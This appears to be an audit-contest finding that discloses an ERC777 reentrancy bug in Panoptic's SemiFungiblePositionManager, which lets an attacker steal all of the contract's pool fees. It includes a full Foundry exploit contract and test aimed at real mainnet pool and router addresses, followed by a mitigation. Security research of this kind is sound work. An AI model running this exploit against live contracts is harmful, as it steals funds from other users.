[H-01] Attacker can steal all fees from SFPM in pools with ERC777 tokens
Submitted bymonrel, also found byhash,linmiaomiao, andbin2chen
An attacker can steal all outstanding fees belonging to the SFPM in a uniswap pool if a token in the pool is an ERC777.
Proof of Concept
The attack is possible due to the following sequence of events when minting a short option withminTokenizedPosition():
ERC1155 is minted.L521
_mint(msg.sender,tokenId,positionSize);
Liquidity is updated.L1004
s_accountLiquidity[positionKey] =uint256(0).toLeftSlot(removedLiquidity).toRightSlot(
An LP position is minted and tokens are transferred frommsg.senderto uniswap.L1031
_moved=isLong==0?_mintLiquidity(_liquidityChunk,_univ3pool):_burnLiquidity(_liquidityChunk,_univ3pool);
feesBaseis updated.L1062
s_accountFeesBase[positionKey] =_getFeesBase(_univ3pool,updatedLiquidity,_liquidityChunk);
If at least one of the tokens transferred at step 3 is an ERC777msg.sendercan implement atokensToSender()hook and transfer the ERC1155 befores_accountFeesBase[positionKey]has been updated.registerTokenTransfer()will copys_accountLiquidity[positionKey]>0ands_accountFeesBase[positionKey] = 0such that the receiver now has a ERC1155 position with non-zero liquidity but afeesBase = 0.
When this position is burned the fees collected are calculated based on:L1209
int256amountToCollect=_getFeesBase(univ3pool,startingLiquidity,liquidityChunk).sub(s_accountFeesBase[positionKey]
The attacker will withdraw fees based on the current value offeeGrowthInside0LastX128andfeeGrowthInside1LastX128and not the difference between the current values and when the short position was created.
The attacker can chose the tick range such thatfeeGrowthInside1LastX128andfeeGrowthInside1LastX128are as large as possible to minimize the liquidity needed steal all available fees.
TheAttackImpcontract below implements thetokensToSend()hook and transfer the ERC1155 beforefeesBasehas been set.  An addressAttackerdeploysAttackImpand callsAttackImp#minAndTransfer()to start the attack. To finalize the attack they burn the position and steal all available fees that belong to the SFPM.
In the POC we use the VRA pool as an example of a uniswap pool with a ERC777 token.
Create a test file in2023-11-panoptic/test/foundry/core/Attacker.t.soland paste the below code. Runforge test --match-test testAttack --fork-url "https://eth.public-rpc.com" --fork-block-number 18755776 -vvvto execute the POC.
// SPDX-License-Identifier: UNLICENSEDpragmasolidity^0.8.0;import"forge-std/Test.sol";import{stdMath}from"forge-std/StdMath.sol";import{Errors}from"@libraries/Errors.sol";import{Math}from"@libraries/Math.sol";import{PanopticMath}from"@libraries/PanopticMath.sol";import{CallbackLib}from"@libraries/CallbackLib.sol";import{TokenId}from"@types/TokenId.sol";import{LeftRight}from"@types/LeftRight.sol";import{IERC20Partial}from"@testUtils/IERC20Partial.sol";import{TickMath}from"v3-core/libraries/TickMath.sol";import{FullMath}from"v3-core/libraries/FullMath.sol";import{FixedPoint128}from"v3-core/libraries/FixedPoint128.sol";import{IUniswapV3Pool}from"v3-core/interfaces/IUniswapV3Pool.sol";import{IUniswapV3Factory}from"v3-core/interfaces/IUniswapV3Factory.sol";import{LiquidityAmounts}from"v3-periphery/libraries/LiquidityAmounts.sol";import{SqrtPriceMath}from"v3-core/libraries/SqrtPriceMath.sol";import{PoolAddress}from"v3-periphery/libraries/PoolAddress.sol";import{PositionKey}from"v3-periphery/libraries/PositionKey.sol";import{ISwapRouter}from"v3-periphery/interfaces/ISwapRouter.sol";import{SemiFungiblePositionManager}from"@contracts/SemiFungiblePositionManager.sol";import{IERC20}from"@openzeppelin/contracts/token/ERC20/IERC20.sol";import{PositionUtils}from"../testUtils/PositionUtils.sol";import{UniPoolPriceMock}from"../testUtils/PriceMocks.sol";import{ReenterMint,ReenterBurn}from"../testUtils/ReentrancyMocks.sol";import{ERC1820Implementer}from"openzeppelin-contracts/contracts/utils/introspection/ERC1820Implementer.sol";import{IERC1820Registry}from"openzeppelin-contracts/contracts/utils/introspection/IERC1820Registry.sol";import{ERC1155Receiver}from"openzeppelin-contracts/contracts/token/ERC1155/utils/ERC1155Receiver.sol";import"forge-std/console2.sol";contractSemiFungiblePositionManagerHarnessisSemiFungiblePositionManager{constructor(IUniswapV3Factory_factory)SemiFungiblePositionManager(_factory) {}functionpoolContext(uint64poolId)publicviewreturns(PoolAddressAndLockmemory) {returns_poolContext[poolId];}functionaddrToPoolId(addresspool)publicviewreturns(uint256) {returns_AddrToPoolIdData[pool];}}contractAttackImpisERC1820Implementer{bytes32constantprivateTOKENS_SENDER_INTERFACE_HASH=0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895;IERC1820Registry_ERC1820_REGISTRY=IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);SemiFungiblePositionManagerHarnesssfpm;ISwapRouterrouter=ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);addresstoken0;addresstoken1;uint256tokenId;uint128positionSize;addressowner;constructor(address_token0,address_token1,address_sfpm) {owner=msg.sender;sfpm=SemiFungiblePositionManagerHarness(_sfpm);token0=_token0;token1=_token1;IERC20Partial(token0).approve(address(sfpm),type(uint256).max);IERC20Partial(token1).approve(address(sfpm),type(uint256).max);IERC20Partial(token0).approve(address(router),type(uint256).max);IERC20Partial(token1).approve(address(router),type(uint256).max);_registerInterfaceForAddress(TOKENS_SENDER_INTERFACE_HASH,address(this));IERC1820Registry(_ERC1820_REGISTRY).setInterfaceImplementer(address(this),TOKENS_SENDER_INTERFACE_HASH,address(this));}functiononERC1155Received(address_operator,address_from,uint256_id,uint256_value,bytescalldata_data)externalreturns(bytes4){returnbytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"));}functionmintAndTransfer(uint256_tokenId,uint128_positionSize,int24slippageTickLimitLow,int24slippageTickLimitHigh)public{tokenId=_tokenId;positionSize=_positionSize;sfpm.mintTokenizedPosition(tokenId,positionSize,slippageTickLimitLow,slippageTickLimitHigh);}functiontokensToSend(addressoperator,addressfrom,addressto,uint256amount,bytescalldatauserData,bytescalldataoperatorData)external{sfpm.safeTransferFrom(address(this),owner,tokenId,positionSize,bytes(""));}}contractstealFeesisTest{usingTokenIdforuint256;usingLeftRightforint256;usingLeftRightforuint256;addressVRA=0xF411903cbC70a74d22900a5DE66A2dda66507255;addressWETH=0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;IUniswapV3PoolPOOL=IUniswapV3Pool(0x98409d8CA9629FBE01Ab1b914EbF304175e384C8);IUniswapV3FactoryV3FACTORY=IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);ISwapRouterrouter=ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);SemiFungiblePositionManagerHarnesssfpm;IUniswapV3Poolpool;uint64poolId;addresstoken0;addresstoken1;uint24fee;int24tickSpacing;uint256isWETH;int24currentTick;uint160currentSqrtPriceX96;uint256feeGrowthGlobal0X128;uint256feeGrowthGlobal1X128;addressAttacker=address(0x12356838383);addressMerlin=address(0x12349931);addressSwapper=address(0x019399312349931);//Width and strike is set such that at least one tick is already initializedint24width=60;int24strike=125160+60;uint256tokenId;AttackImpImplementer;int24tickLower;int24tickUpper;uint128positionSize;uint128positionSizeBurn;functionsetUp()public{sfpm=newSemiFungiblePositionManagerHarness(V3FACTORY);}function_initPool(uint256seed)internal{_cacheWorldState(POOL);sfpm.initializeAMMPool(token0,token1,fee);}function_cacheWorldState(IUniswapV3Pool_pool)internal{pool=_pool;poolId=PanopticMath.getPoolId(address(_pool));token0=_pool.token0();token1=_pool.token1();isWETH=token0==address(WETH) ?0:1;fee=_pool.fee();tickSpacing=_pool.tickSpacing();(currentSqrtPriceX96,currentTick, , , , , ) =_pool.slot0();feeGrowthGlobal0X128=_pool.feeGrowthGlobal0X128();feeGrowthGlobal1X128=_pool.feeGrowthGlobal1X128();}functionaddUniv3pool(uint256self,uint64_poolId)internalpurereturns(uint256) {unchecked{returnself+uint256(_poolId);}}functiongenerateFees(uint256run)internal{for(uint256x;x<run;x++) {}}functiontestAttack()public{_initPool(1);positionSize=1e18;tokenId=uint256(0).addUniv3pool(poolId).addLeg(0,1,isWETH,0,0,0,strike,width);(tickLower,tickUpper) =tokenId.asTicks(0,tickSpacing);//------------ Honest user mints short position ------------------------------vm.startPrank(Merlin);deal(token0,Merlin,type(uint128).max);deal(token1,Merlin,type(uint128).max);IERC20Partial(token0).approve(address(sfpm),type(uint256).max);IERC20Partial(token1).approve(address(sfpm),type(uint256).max);IERC20Partial(token0).approve(address(router),type(uint256).max);IERC20Partial(token1).approve(address(router),type(uint256).max);(int256totalCollected,int256totalSwapped,int24newTick) =sfpm.mintTokenizedPosition(tokenId,uint128(positionSize),TickMath.MIN_TICK,TickMath.MAX_TICK);(uint128premBeforeSwap0,uint128premBeforeSwap1) =sfpm.getAccountPremium(address(pool),Merlin,0,tickLower,tickUpper,currentTick,0);uint256accountLiqM=sfpm.getAccountLiquidity(address(POOL),Merlin,0,tickLower,tickUpper);console2.log("Premium in token0 belonging to Merlin before swaps:   ",Math.mulDiv64(premBeforeSwap0,accountLiqM.rightSlot()));console2.log("Premium in token1 belonging to Merlin before swaps:   ",Math.mulDiv64(premBeforeSwap1,accountLiqM.rightSlot()));//------------ Swap in pool to generate fees -----------------------------changePrank(Swapper);deal(token0,Swapper,type(uint128).max);deal(token1,Swapper,type(uint128).max);IERC20Partial(token0).approve(address(router),type(uint256).max);IERC20Partial(token1).approve(address(router),type(uint256).max);uint256swapSize=10e18;router.exactInputSingle(ISwapRouter.ExactInputSingleParams(isWETH==0?token0:token1,isWETH==1?token0:token1,fee,Swapper,block.timestamp,swapSize,0,0));router.exactOutputSingle(ISwapRouter.ExactOutputSingleParams(isWETH==1?token0:token1,isWETH==0?token0:token1,fee,Swapper,block.timestamp,swapSize- (swapSize*fee) /1_000_000,type(uint256).max,0));(,currentTick, , , , , ) =pool.slot0();// poke uniswap poolchangePrank(address(sfpm));pool.burn(tickLower,tickUpper,0);(uint128premAfterSwap0,uint128premAfterSwap1) =sfpm.getAccountPremium(address(pool),Merlin,0,tickLower,tickUpper,currentTick,0);console2.log("Premium in token0 belonging to Merlin after swaps:    ",Math.mulDiv64(premAfterSwap0,accountLiqM.rightSlot()));console2.log("Premium in token1 belonging to Merling after swaps:   ",Math.mulDiv64(premAfterSwap1,accountLiqM.rightSlot()));// -------------- Attack is performed  -------------------------------changePrank(Attacker);Implementer=newAttackImp(token0,token1,address(sfpm));deal(token0,address(Implementer),type(uint128).max);deal(token1,address(Implementer),type(uint128).max);Implementer.mintAndTransfer(tokenId,uint128(positionSize),TickMath.MIN_TICK,TickMath.MAX_TICK);uint256balance=sfpm.balanceOf(Attacker,tokenId);uint256balance2=sfpm.balanceOf(Merlin,tokenId);(uint128premTokenAttacker0,uint128premTokenAttacker1) =sfpm.getAccountPremium(address(pool),Merlin,0,tickLower,tickUpper,currentTick,0);(, , ,uint256tokensowed0,uint256tokensowed1) =pool.positions(PositionKey.compute(address(sfpm),tickLower,tickUpper));console2.log("Fees in token0 available to SFPM before attack:       ",tokensowed0);console2.log("Fees in token1 available to SFPM before attack:       ",tokensowed1);sfpm.burnTokenizedPosition(tokenId,uint128(positionSize),TickMath.MIN_TICK,TickMath.MAX_TICK);(, , ,tokensowed0,tokensowed1) =pool.positions(PositionKey.compute(address(sfpm),tickLower,tickUpper));console2.log("Fees in token0 available to SFPM after attack:        ",tokensowed0);console2.log("Fees in token1 available to SFPM after attack:        ",tokensowed1);{// Tokens used for attack, deposited through implementeruint256attackerDeposit0=type(uint128).max-IERC20(token0).balanceOf(address(Implementer));uint256attackerDeposit1=type(uint128).max-IERC20(token1).balanceOf(address(Implementer));uint256attackerProfit0=IERC20(token0).balanceOf(Attacker)-attackerDeposit0;uint256attackerProfit1=IERC20(token1).balanceOf(Attacker)-attackerDeposit1;console2.log("Attacker Profit in token0:                            ",attackerProfit0);console2.log("Attacker Profit in token1:                            ",attackerProfit1);assertGe(attackerProfit0+attackerProfit1,0);}}}
Tools Used
VScode, Foundry
Recommended Mitigation Steps
Update liquidity after minting/burning:
_moved=isLong==0?_mintLiquidity(_liquidityChunk,_univ3pool):_burnLiquidity(_liquidityChunk,_univ3pool);s_accountLiquidity[positionKey] =uint256(0).toLeftSlot(removedLiquidity).toRightSlot(updatedLiquidity);
For redundancy,registerTokensTransfer()can also use theReentrancyLock()modifier to always block reentrancy when minting and burning.
Assessed type
Reentrancy
dyedm1 (Panoptic) confirmed via duplicate issue #519